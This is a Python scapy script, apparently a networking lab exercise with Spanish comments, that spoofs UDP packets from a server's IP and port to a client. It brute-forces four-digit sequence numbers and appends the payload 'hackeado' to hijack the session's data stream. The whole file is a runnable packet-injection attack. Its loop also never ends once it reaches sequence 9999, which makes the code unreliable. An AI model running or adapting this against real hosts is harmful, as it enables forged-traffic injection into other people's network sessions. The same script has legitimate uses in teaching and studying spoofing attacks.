#!/usr/bin/python3
from scapy.all import *
import sys

# valor default de variable global seq
seq = None

def main(server_ip, server_port, client_ip, client_port):

    global seq

    seq_num = 0
    while seq_num < 10000:

        # similar a to_seq de copy_client.py para transformar a bits
        if seq_num < 9999:
            seq = bytearray([ord('0') + seq_num // 1000, ord('0') + seq_num // 100 % 10, ord('0') + seq_num // 10 % 10, ord('0') + seq_num % 10])
        else:
            continue

        # crear mensaje de hackeado compuesto por la secuencia y un string "hackeado"
        message = seq + b"hackeado"
        
        # crear el paquete IP y UDP falsificado
        ip = IP(src=server_ip, dst=client_ip) # paquete IP con IP de origen y destino
        udp = UDP(sport=int(server_port), dport=int(client_port)) # paquete UDP con puertos de origen y destino
        msg = Raw(load=message)
        packet = ip/udp/msg # combinar paquetes IP y UDP con el mensaje
        
        # enviar el paquete
        send(packet)

        # aumentar seq_num para continuar la iteración
        seq_num += 1

if __name__ == "__main__":

    if len(sys.argv) != 5:
        # mensaje de error por cantidad incorrecta de parámetros
        print("Ejecute con los parámetros correspondientes:\n ./pirata.py <server_ip> <server_port> <client_ip> <client_port>")
        sys.exit(1)

    # línea para poder probar en localhost
    conf.L3socket=L3RawSocket

    # parámetros que se solicitan en el comando:
    server_ip = sys.argv[1]
    server_port = sys.argv[2]
    client_ip = sys.argv[3]
    client_port = sys.argv[4]
    
    # ejecutar función main
    main(server_ip, server_port, client_ip, client_port)
